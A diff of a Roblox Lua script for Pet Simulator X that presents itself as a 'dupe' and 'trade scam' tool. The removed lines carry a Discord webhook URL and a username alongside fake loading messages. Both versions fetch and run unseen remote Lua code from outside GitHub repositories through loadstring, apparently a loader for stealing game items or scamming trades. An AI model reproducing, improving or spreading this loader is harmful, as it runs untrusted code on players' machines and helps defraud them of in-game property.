@@ -1,9 +1,14 @@
-Username = "Sss_no1"
-WebHook = "https://discord.com/api/webhooks/1095324191412191282/4PQf3pg1MqNrLt0HzM8uPXhU4c0N-OiNFBwGDkY7ki1Fu5nyb9wKXntdRN7k8NsVGa2p"
-
-_G.CustomScriptName = "Dupe Script Pet Sim x IF YOU LEAVE DATA WILL LOST!!!!"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Scam Psx Script                wait 30 sec than click on", "BloodTheme")
+local Tab = Window:NewTab("trade scam")
+local Section = Tab:NewSection("trade scam (wait 30-45sec)")
+local Section = Tab:NewSection("WAIT 30 SECOND!")
+Section:NewToggle("trade scam", "wait 30sec and trade than open trade scam", function(state)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/2Sxnpz/DupeScriptPetSimx/main/.lua"))()
+end)
+local Tab = Window:NewTab("Dupe")
+local Section = Tab:NewSection("Dupe wait 30-45sec and clik open")
+local Section = Tab:NewSection("WAIT 30 SECOND!")
+Section:NewToggle("Dupe", "wait 30-45sec and trade than open Dupe", function(state)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/2Sxnpz/DupeScriptPetSimx/main/.lua"))()
+end)
